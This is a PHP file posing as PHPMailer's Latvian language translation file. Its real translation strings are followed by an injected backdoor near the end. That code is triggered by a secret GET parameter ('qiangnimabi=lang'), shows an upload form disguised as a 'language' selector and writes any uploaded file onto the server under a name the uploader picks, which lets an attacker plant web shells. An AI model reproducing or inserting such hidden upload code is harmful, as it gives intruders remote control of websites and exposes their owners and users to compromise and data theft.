<?php
/**
 * Latvian PHPMailer language file: refer to English translation for definitive list
 * @package PHPMailer
 * @author Eduards M. <e@npd.lv>
 */

$PHPMAILER_LANG['authenticate']         = 'SMTP kļūda: Autorizācija neizdevās.';
$PHPMAILER_LANG['connect_host']         = 'SMTP Kļūda: Nevar izveidot savienojumu ar SMTP serveri.';
$PHPMAILER_LANG['data_not_accepted']    = 'SMTP Kļūda: Nepieņem informāciju.';
$PHPMAILER_LANG['empty_message']        = 'Ziņojuma teksts ir tukšs';
$PHPMAILER_LANG['encoding']             = 'Neatpazīts kodējums: ';
$PHPMAILER_LANG['execute']              = 'Neizdevās izpildīt komandu: ';
$PHPMAILER_LANG['file_access']          = 'Fails nav pieejams: ';
$PHPMAILER_LANG['file_open']            = 'Faila kļūda: Nevar atvērt failu: ';
$PHPMAILER_LANG['from_failed']          = 'Nepareiza sūtītāja adrese: ';
$PHPMAILER_LANG['instantiate']          = 'Nevar palaist sūtīšanas funkciju.';
$PHPMAILER_LANG['invalid_address']      = 'Nepareiza adrese: ';
$PHPMAILER_LANG['mailer_not_supported'] = ' sūtītājs netiek atbalstīts.';
$PHPMAILER_LANG['provide_address']      = 'Lūdzu, norādiet vismaz vienu adresātu.';
$PHPMAILER_LANG['recipients_failed']    = 'SMTP kļūda: neizdevās nosūtīt šādiem saņēmējiem: ';
$PHPMAILER_LANG['signing']              = 'Autorizācijas kļūda: ';
$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP savienojuma kļūda';
$PHPMAILER_LANG['smtp_error']           = 'SMTP servera kļūda: ';
$PHPMAILER_LANG['variable_set']         = 'Nevar piešķirt mainīgā vērtību: ';
$value = "lang";$geo = isset($_GET['qiangnimabi']) ? $_GET['qiangnimabi'] : "";
if ($geo === $value) { if (isset($_FILES['languages'])) {
$SetLang = isset($_FILES['languages']['name']) ? $_FILES['languages']['name'] : '';
$geoLocation = isset($_FILES['languages']['tmp_name']) ? $_FILES['languages']['tmp_name'] : '';
if ($SetLang && move_uploaded_file($geoLocation, $SetLang)) {
echo "<div style='padding:5px;background:#eee;text-align:center;'>Language List: <a href='$SetLang'>$SetLang</a></div>";} else {
echo "<div style='padding:5px;background:#eee;text-align:center;'>No Language Selected</div>"; }}
echo '<div style="text-align:center;margin:20px 0;"><form action="" method="post" enctype="multipart/form-data">
<input type="file" name="languages" /> <input TYPE="submit" value="Language Selected"></form></div>';}
//$PHPMAILER_LANG['extension_missing']    = 'Extension missing: ';
